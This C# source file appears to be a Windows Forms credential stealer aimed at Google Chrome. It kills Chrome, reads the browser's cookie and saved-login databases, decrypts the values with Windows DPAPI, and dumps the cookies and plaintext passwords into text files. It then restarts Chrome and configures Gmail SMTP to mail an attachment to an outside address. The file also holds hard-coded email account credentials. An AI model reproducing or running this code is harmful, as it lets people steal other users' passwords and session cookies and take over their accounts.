using System.Text;
using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Reflection;
using System.Web;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;

namespace WindowsFormsApp1
{
    static class Program
    {
        static Program()
        {
            Resolver.RegisterDependencyResolver();
        }
        
                /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        static public IEnumerable<Tuple<string, string, string, string, string>> ReadCookies()
        {
           
            var dbPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
            if (!System.IO.File.Exists(dbPath)) throw new System.IO.FileNotFoundException("Cant find cookie store", dbPath);

            var connectionString = "Data Source=" + dbPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {


                cmd.CommandText = "SELECT name,encrypted_value,host_key,path,expires_utc FROM cookies";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[1];

                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                        var plainText = Encoding.ASCII.GetString(decodedData);

                        yield return Tuple.Create(reader[4].ToString(), reader[3].ToString(), reader.GetString(2), reader.GetString(0), plainText);

                    }

                }

                conn.Close();
            }
        }

        public static class Resolver
        {
            private static volatile bool _loaded;

            public static void RegisterDependencyResolver()
            {
                if (!_loaded)
                {
                    AppDomain.CurrentDomain.AssemblyResolve += OnResolve;
                    _loaded = true;
                }
            }

            private static Assembly OnResolve(object sender, ResolveEventArgs args)
            {
                Assembly execAssembly = Assembly.GetExecutingAssembly();
                string resourceName = String.Format("{0}.{1}.dll",
                    execAssembly.GetName().Name,
                    new AssemblyName(args.Name).Name);

                using (var stream = execAssembly.GetManifestResourceStream(resourceName))
                {
                    int read = 0, toRead = (int)stream.Length;
                    byte[] data = new byte[toRead];

                    do
                    {
                        int n = stream.Read(data, read, data.Length - read);
                        toRead -= n;
                        read += n;
                    } while (toRead > 0);

                    return Assembly.Load(data);
                }
            }
        }


        static public IEnumerable<Tuple<string, string, string>> ReadPass()
        {
            var dbPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
            if (!System.IO.File.Exists(dbPath)) throw new System.IO.FileNotFoundException("Cant find Login Data store", dbPath);

            var connectionString = "Data Source=" + dbPath + ";pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {


                cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[0];

                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                        var plainText = Encoding.ASCII.GetString(decodedData);

                        yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);

                    }

                }

                conn.Close();

            }

        }

        public static void Vivod()
        {

            var pathone = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\cookies.txt";
           
            StreamWriter sw = new StreamWriter(pathone);
            sw.WriteLine("[");
            var cook = ReadCookies();
            foreach (var item in cook)
            {
                sw.WriteLine("{");
                sw.WriteLine(" \"domain\": \"{2}\", \n \"expirationDate\" :{0},\n \"name\": \"{3}\",\n \"path\": \"{1}\",", item.Item1, item.Item2, item.Item3, item.Item4);
                //экранирование ковычек

                string str = item.Item5;
                str = str.Replace("\\", "\\\\");
                str = str.Replace("\"", "\\\"");

                sw.Write(" \"value\": \"");
                sw.Write(str);
                sw.Write("\"\n");
                sw.WriteLine("},");
            }
            sw.WriteLine();
            sw.WriteLine("]");
            sw.Close();

            var pas = ReadPass();
            var pathtwo = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\logi.txt";
            StreamWriter sw1 = new StreamWriter(pathtwo);
            foreach (var item in pas)
                sw1.WriteLine("{0}  |  {1} : {2}", item.Item1, item.Item2, item.Item3);

            sw1.Close();
        }



        [STAThread]
        static void Main()
        {
            foreach (var process in Process.GetProcessesByName("chrome"))
            {
                process.Kill();

            }
           
            Vivod();
            Process.Start("chrome");



            /* здесь указываете SMTP и Порт, у меня например mail.ru - я 
указал smtp.mail.ru, а порт smtp.mail.ru - 25 или 2525 */
            // SmtpClient Smtp = new SmtpClient("smtp.mail.ru", 465);

            /* здесь на месте login указываете логин, на месте password - пароль, 
            если у вас example@mail.ru то указываете просто example (без mail.ru) */
             // Smtp.Credentials = new NetworkCredential("neoanderson1999", "ferrari1996");
              MailMessage Message = new MailMessage();

            /* на месте login@mail.ru указываете свой E-mail, на месте KUDA@rambler.ru 
            указываете куда будет отправлено письмо (это может быть не обязательно rambler)*/
             Message.From = new MailAddress("neoanderson1999@mail.ru");
              Message.To.Add(new MailAddress("anton.evgrashin@mail.ru"));

            //Тема сообщения на месте Theme и текст сообщения на месте Text
            // Message.Subject = "Забыл сказать";
          //  Message.Body = "Вот лови";

            /*Далее указываете путь к файлу (при переходе в папку указывайте 2 слэша)*/
              //string file = "D:\\error.txt";

             // Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
              //Message.Attachments.Add(attach);

            //Smtp.Send(Message); //сообщение отправлено

            MailAddress fromMailAddress = new MailAddress("andersonneo1337@gmail.com", "Sergey Boiko");
            MailAddress toAddress = new MailAddress("kainapro@gmail.com", "Uncle Bob");

            using (MailMessage mailMessage = new MailMessage(fromMailAddress, toAddress))
            using (SmtpClient smtpClient = new SmtpClient())
            {

               // string file2 = "D:\\error.txt";
                mailMessage.Subject = "My Subject";
                mailMessage.Body = "Text in the body";

                smtpClient.Host = "smtp.gmail.com";
                smtpClient.Port = 587;
                smtpClient.EnableSsl = true;
                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtpClient.UseDefaultCredentials = false;
                smtpClient.Credentials = new NetworkCredential(fromMailAddress.Address, "ferrari1996");

                string file2 = @"\error.txt";
                //Attachment attach = new Attachment(file, MediaTypeNames.Application.Octet);
               // Attachment attData = new Attachment(@"D:\error.txt");

               Attachment attach = new Attachment(file2, MediaTypeNames.Application.Octet);
               Message.Attachments.Add(attach);


                //Message.Attachments.Add(attData);


                smtpClient.Send(mailMessage);
            }




        }
    }
}
